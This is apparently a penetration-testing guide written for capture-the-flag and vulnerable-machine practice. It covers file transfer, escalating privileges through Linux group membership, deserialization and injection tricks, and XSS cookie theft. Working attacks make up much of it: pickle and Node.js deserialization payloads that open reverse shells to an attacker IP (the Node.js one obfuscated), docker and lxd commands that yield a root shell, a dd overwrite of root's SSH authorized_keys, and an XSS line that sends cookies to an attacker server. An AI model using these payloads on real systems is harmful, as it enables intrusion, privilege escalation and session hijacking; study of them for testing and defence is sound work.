While downloading files from ftp, remember to switch to binary mode, otherwise the file could be corrupted.

#### Setting up the Server

We can either use Python-pyftpdlib or Metasploit to create a FTP Server

**Python-pyftpdlib**

Install using apt

```none
apt-get install python-pyftpdlib
```

Now from the directory we want to serve, just run the Python module. It runs on port 2121 by default (can be changed using -p parameter) and accepts anonymous authentication. To listen on the standard port:

```none
/home/bitvijays/SHELLS$ python -m pyftpdlib -p 21

Usage: python -m pyftpdlib [options]

Start a stand alone anonymous FTP server.

Options:
  -h, --help : show this help message and exit
  -i ADDRESS, --interface=ADDRESS : specify the interface to run on (default all interfaces)
  -p PORT, --port=PORT : specify port number to run on (default 2121)
  -w, --write :  grants write access for logged in user (default read-only)
  -d FOLDER, --directory=FOLDER : specify the directory to share (default current directory)
  -n ADDRESS, --nat-address=ADDRESS : the NAT address to use for passive connections
  -r FROM-TO, --range=FROM-TO : the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
  -D, --debug : enable DEBUG logging evel
  -v, --version : print pyftpdlib version and exit
  -V, --verbose : activate a more verbose logging
  -u USERNAME, --username=USERNAME : specify username to login with (anonymous login will be disabled and password required if supplied)
  -P PASSWORD, --password=PASSWORD : specify a password to login with (username required to be useful)
```

**Metasploit**

```none
Name: FTP File Server
Module: auxiliary/server/ftp
License: Metasploit Framework License (BSD)
Rank: Normal
  
Provided by:
hdm <x@hdm.io>

Available actions:
Name     Description
----     -----------
Service

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
FTPPASS                    no        Configure a specific password that should be allowed access
FTPROOT   /tmp/ftproot     yes       The FTP root directory to serve files from
FTPUSER                    no        Configure a specific username that should be allowed access
PASVPORT  0                no        The local PASV data port to listen on (0 is random)
SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
SRVPORT   21               yes       The local port to listen on.
SSL       false            no        Negotiate SSL for incoming connections
SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)

Description:
This module provides a FTP service
```

#### Access using FTP

```none
ftp 10.10.10.10
Connected to 10.10.10.10.
220 FTP Server Ready
Name (localhost:root): anonymous
331 User name okay, need password...
Password:
230 Login OK
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls
total 160
drwxr-xr-x   2 0      0       512 Jan  1  2000 ..
drwxr-xr-x   2 0      0       512 Jan  1  2000 .
-rw-r--r--   1 0      0       166 Jan  1  2000 secret.zip
226 Transfer complete.

ftp> get secret.zip
local: secret.zip remote: secret.zip
200 PORT command successful.
150 Opening BINARY mode data connection for secret.zip
226 Transfer complete.
166 bytes received in 0.00 secs (138.4367 kB/s)
ftp>
```

FTP can also accepts a series of commands stored in a text file

Contents of a text file

```none
open 10.10.10.10
anonymous  
anonymous  
binary  
get ps.exe 
bye 
```

Passing parameter to ftp

```none
ftp -s:filename-containing-commands
```

The file can be created by using echo

```none
echo "open 10.10.10.10" >> commands.txt
echo "anonymous" >> commands.txt
```

### TFTP

We can also utilize TFTP to download or upload files

#### Setting up the Server

Metasploit module

```none
use auxiliary/server/tftp
msf auxiliary(server/tftp) > info

      Name: TFTP File Server
    Module: auxiliary/server/tftp
    License: Metasploit Framework License (BSD)
      Rank: Normal

Provided by:
  jduck <jduck@metasploit.com>
  todb <todb@metasploit.com>

Available actions:
  Name     Description
  ----     -----------
  Service  

Basic options:
  Name        Current Setting  Required  Description
  ----        ---------------  --------  -----------
  OUTPUTPATH  /tmp             yes       The directory in which uploaded files will be written.
  SRVHOST     0.0.0.0          yes       The local host to listen on.
  SRVPORT     69               yes       The local port to listen on.
  TFTPROOT    /tmp             yes       The TFTP root directory to serve files from

Description:
  This module provides a TFTP service

msf auxiliary(server/tftp) > run 
[*] Auxiliary module running as background job 0.

[*] Starting TFTP server on 0.0.0.0:69...
[*] Files will be served from /tmp
[*] Uploaded files will be saved in /tmp
```

#### Accessing the Share

Downloading a file

```none
tftp -i 10.10.10.10 GET ps.exe
```

Uploading a file

```none
tftp -i 10.10.10.10 PUT Passwords.txt
```

#### Installing tftp - Windows

```none
pkgmgr /iu:"TFTP"
```

## Appendix-IV Linux Group Membership Issues

Let's examine in what groups we are members. Recommended read about groups: [Users and Groups](https://wiki.archlinux.org/index.php/users_and_groups) and [System Groups](https://wiki.debian.org/SystemGroups)

### Docker Group

Any user who is part of the docker group should also be considered root. Read [Using the docker command to root the host](http://reventlov.com/advisories/using-the-docker-command-to-root-the-host) Older version of docker were vulnerable to Docker breakout. More details at [Shocker / Docker Breakout PoC](https://github.com/gabrtv/shocker)

If you are the docker user and want to get root.

#### Create a Dockerfile

```none
mkdir docker-test
cd docker-test

cat > Dockerfile
FROM debian:wheezy
ENV WORKDIR /stuff
RUN mkdir -p $WORKDIR
VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR
```

#### Build the Docker

```none
docker build -t my-docker-image .
```

Note

If there are already docker images present on the host machine, we can utilize those also instead of making a new one. If there are none, we can copy a image to the vulnerable machine.

**Copy docker images from one host to another without via repository?**

Save the docker image as a tar file:

```none
docker save -o <path for generated tar file> <image name>
```

Then copy the image to a new system with regular file transfer tools such as cp or scp. After that, load the image into docker:

```none
docker load -i <path to image tar file>
```

#### Become root?

- Copy binaries from the container into the host and give them suid permissions:

  ```none
  docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'

  ./sh
  whoami
  # root
  ```

  If the sh is not working, create a suid.c, compile it, suid it and run.

- Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:

  ```none
  docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat shadow'
  # root:!:16364:0:99999:7:::
  # daemon:*:16176:0:99999:7:::
  # bin:*:16176:0:99999:7:::
  # ...
  ```

- Bind the host’s / and overwrite system commands with rogue programs:

  ```none
  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/rogue-program /stuff/bin/cat'
  ```

- Privileged copy of bash for later access?

  ```none
  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/bin/bash /stuff/bin/root-shell-ftw && chmod a+s /stuff/bin/root-shell-ftw'
  root-shell-ftw  -p
  root-shell-ftw-4.3#
  ```

### Video

If the user is a part of the video group, he possibly might have access to the frame buffer (/dev/fb0) (which provides an abstraction for the video hardware), video capture devices, 2D/3D hardware acceleration. More details can be found at [Linux Framebuffer](https://en.wikipedia.org/wiki/Linux_framebuffer) and [Kernel Framebuffer <https://www.kernel.org/doc/Documentation/fb/framebuffer.txt)

If, we have access to the framebuffer device /dev/fb0. We can use a tool like [fb2png](https://github.com/AndrewFromMelbourne/fb2png) to convert it to a png picture or we can cat it and get a file:

```none
cat /dev/fb0 > screenshot.raw

ls -l screenshot.raw 
-rw-rw-r-- 1 user user 4163040 May 18 03:52 screenshot.raw
```

To find the screen resolution, we can read virtual size

```none
cat /sys/class/graphics/fb0/virtual_size
1176,885
```

We can then open the screenshot as a raw file (Select File Type: Raw Image Data) in Gimp, enter the width and height as well of the color arrangement, RGB, RGBA etc.

### Disk

Debian's wiki says about the "disk" group: Raw access to disks. Mostly equivalent to root access. The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.

We can use debugfs command to read everything and dd command to write anywhere.

Read /root/.ssh/authorized_keys using debugfs:

```none
user@hostname:/tmp$ debugfs -w /dev/sda1 -R "cat /root/.ssh/authorized_keys"
debugfs 1.42.13 (17-May-2015)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
```

Let's find the block where the "/root/.ssh/authorized_keys" file resides:

```none
user@hostname:/tmp$ debugfs /dev/sda1 -R "blocks /root/.ssh/authorized_keys"
debugfs 1.42.13 (17-May-2015)
1608806
```

Let's use dd to write our own public key inside /root/.ssh/authorized_keys. This command will write over (i.e. it will replace) the old data:

```none
user@hostname:/tmp$ dd if=/tmp/id_rsa.pub of=/dev/sda1 seek=1608806 bs=4096 count=1
0+1 records in
0+1 records out
394 bytes copied, 0.00239741 s, 164 kB/s
```

It's important to sync afterwards:

```none
user@hostname:/tmp$ sync
```

Read again to check if the file was overwritten

```none
user@hostname:/tmp$ debugfs -w /dev/sda1 -R "cat /root/.ssh/authorized_keys"
debugfs 1.42.13 (17-May-2015)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
```

More usage details about can be found at [debugfs Command Examples](https://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html)

#### Set file system

```none
> debugfs /dev/hda6
debugfs 1.19, 13-Jul-2000 for EXT2 FS 0.5b, 95/08/09
```

#### List files

```none
debugfs:  ls
2790777 (12) .   32641 (12) ..   2790778 (12) dir1   2790781 (16) file1
2790782 (4044) file2
```

#### List the files with a long listing

Format is:

- Field 1:  Inode number.
- Field 2:  First one or two digits is the type of node:
  - 2 = Character device
  - 4 = Directory
  - 6 = Block device
  - 10 = Regular file
  - 12 = Symbolic link
  - The Last four digits are the Linux permissions
- Field 3: Owner uid
- Field 4: Group gid
- Field 5: Size in bytes.
- Field 6: Date
- Field 7: Time of last creation.
- Field 8: Filename.

```none
debugfs:  ls -l
2790777  40700   2605   2601    4096  5-Nov-2001 15:30 .
  32641   40755   2605   2601    4096  5-Nov-2001 14:25 ..
2790778  40700   2605   2601    4096  5-Nov-2001 12:43 dir1
2790781 100600   2605   2601      14  5-Nov-2001 15:29 file1
2790782 100600   2605   2601      14  5-Nov-2001 15:30 file2
```

#### Dump the contents of file1

```none
debugfs: cat file1
This is file1
```

#### Dump an inode to a file

Same as cat, but to a file and using inode number instead of the file name.

```none
debugfs: dump <2790782> file1-debugfs
```

The above will copy the file to your file-system, useful when the flag is not in a text file and is in the jpg file or somethingelse.

### LXD

The below has been taken from [LXD-Escape](https://reboare.github.io/lxd/lxd-escape.html)

LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. The lxd group should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group.

#### Exploiting

```none
ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
Creating test 

ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
Device whatever added to test 

ubuntu@ubuntu:~$ lxc start test 
ubuntu@ubuntu:~$ lxc exec test bash
```

Here we have created an lxc container, assigned it security privileges and mounted the full disk under /mnt/root

```none
ubuntu@ubuntu:~$ lxc exec test bash 
root@test:~# cd /mnt/root 
root@test:/mnt/root# ls 
bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var 
boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz 

root@test:/mnt/root# cd root 
root@test:/mnt/root/root# ls 
root@test:/mnt/root/root# touch ICanDoWhatever 
root@test:/mnt/root/root# exit 
exit
```

At this point, we can write a ssh public key to the root/.ssh folder and use that to access the machine.

## Appendix-V Coding Languages Tricks

### Python

#### Pickle

If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like

```none
cPickle.loads(data)
```

The pickle website say *Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.*

we may use

```none
class Shell_code(object):
def __reduce__(self):
        return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"ListeningPORT" 0>&1',))
    or   return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|bin/nc 10.10.14.XX 4444 >/tmp/f',))
shell = cPickle.dumps(Shell_code())
```

if we print shell variable above, it would look something like below if python version 2 is used

```none
cposix
system
p1
(S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f'
p2
tp3
Rp4
.
```

and in python version 3

```none
b'\x80\x03cposix\nsystem\nq\x00XT\x00\x00\x00/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/fq\x01\x85q\x02Rq\x03.'
```

Pickle is imported in python 3 as

```none
import _pickle as cPickle
```

and in python 2

```none
import cPickle
```

Now, we can test locally that our code for shell is working by unpickling by

```none
#data.txt containing our Pickled data
import cPickle
path = "/tmp/data.txt"
data = open(path, "rb").read()
item = cPickle.loads(data)
```

Refer [Understanding Python pickling and how to use it securely](https://www.synopsys.com/blogs/software-security/python-pickling/) , [Sour Pickles](http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf) and [Exploiting misuse of Python's "pickle"](https://blog.nelhage.com/2011/03/exploiting-pickle/)

Tip

It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.

### PHP

#### Preg_Replace

PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer [The unexpected dangers of preg_replace()](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) and [Exploiting PHP PCRE Functions](http://www.madirish.net/402) Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.

#### Complex Curly Syntax

PHP has [Complex (curly) syntax](http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) The Complex Syntax to allow evaluation of our own code in double quotes.
  
Example
  
```none
$use_me = "ls -lah"
{${system($use_me)}}
```

This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).

#### Xdebug

If you find uncommon headers such as xdebug in the response, it might be possible to get a reverse shell. Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code execution is possible via injections that exist in eval or property_set xdebug commands. Refer [xpwn - exploiting xdebug enabled servers](https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/)  and [xdebug-shell](https://github.com/gteissier/xdebug-shell)

#### Type Juggling/ Magic Bytes

Type juggling in PHP is caused by an issue of loose operations versus strict operations. Strict comparisons will compare both the data values and the types associated to them. A loose comparison will use context to understand what type the data is. According to PHP documentation for comparison operations at [Language Operators Comparison](http://php.net/manual/en/language.operators.comparison.php)

*If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. These rules also apply to the switch statement. The type conversion does not take place when the comparison is === or !== as this involves comparing the type as well as the value.*

So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.

Refer [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/), [PHP Weak Typing Woes; With Some Pontification about Code and Pen Testing](https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#) and [Writing Exploits For Exotic Bug Classes:
PHP Type Juggling](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)

### LUA

In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is [Lua Web Application Security Vulnerabilities](http://seclists.org/fulldisclosure/2014/May/128)

## Appendix-VI Metasploit Module Writing?

Note

This section is still under progress.

- Creating a new module? create it in your home directory

  ```none
  mkdir -p $HOME/.msf4/modules/exploits
  ```

  If you are using auxiliary or post modules, or are writing payloads you'll want to mkdir those as well.

- Made some changes and want metasploit to pick up those changes? use

  ```none
  msf > reload_all
  ```

- Refer [Loading External Modules](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules) for the above two points.

- Want to edit a module or see the source code of it ? use edit in msfconsole (after selecting the module i.e use module_name)
- Want to write some variable value (like the payload/ mof file) to a file? use

  ```none
  File.Write('/path/to/file', 'Some glorious content')
  ```

- Refer [Documentation for rapid7/metasploit-framework](https://www.rubydoc.info/github/rapid7/metasploit-framework/)
- Refer [How to use WbemExec for a write privilege attack on Windows](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows) and [How to get started with writing an exploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit)

## Appendix-VII Node.js deserialization bug for Remote Code Execution

Untrusted data passed into unserialize() function,which leads to code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).

For experimenting out we neeed to install nodejs , npm and node-serialize.

`apt install nodejs`

`curl -L https://www.npmjs.com/install.sh | sh`

`npm install node-serialize`

and for getting shell we need [nodeshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

and just run : `python nodejsshell.py 10.10.x.x 8001`

we will get the shell payload now we need to serialize it proerly.

```payload
var y = {
rce : function() {eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,53,34,59,10,80,79,82,84,61,34,56,48,48,49,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}
}
var serialize = require(‘node-serialize’);
console.log(“Serialized: \n” + serialize.serialize(y));
```

and now run `node exp.js` and we will get our serialize payload. 

```serialize
{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

now we will add `IIFE`. just add `()` before last curly braces and base64 enocode it and send it through the cookie.

Don't forget to start a reverse shell.

For in depth explaination you can check this [blog](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) out .

## Appendix-VIII - Cookie Stealing using XSS and Escalating Privileges

If there's a xss vulnerability and the owner of the visits it we can steal it's cookie and hijack the session and maybe further escalate the privileges.

we need 2 things :
  1. xss vulnerable parameter.
  2. server publicly available
  3. Victim must visit it.

```note
Note: if you are solving any vulnerable machine and you are on VPN you don't need public server you can just use your own system and start server on port 8000
```

If you found a xss vulnerability try to inject the below payload.

### Step - 1

```js
<img src=x onerror=this.src='http://<YOUR-IP>:8000/?'+document.cookie;>
```

### Step - 2

Start server on port 8000 we can use python as well as ruby or any other method.

```python
sudo python2 -m SimpleHTTPServer 8000
```

### Step - 3

Wait for the victim to visit it, when victim visits it you will be able to see it's session cookie in your system now just replace victim cookie with your own cookie using inspect element or any other tool and refresh and we can finally able to hijack the session.

## Changelog

```none
.. git_changelog::
  :filename_filter: docs/LFC-VulnerableMachines.rst
```

```none
.. disqus::
```
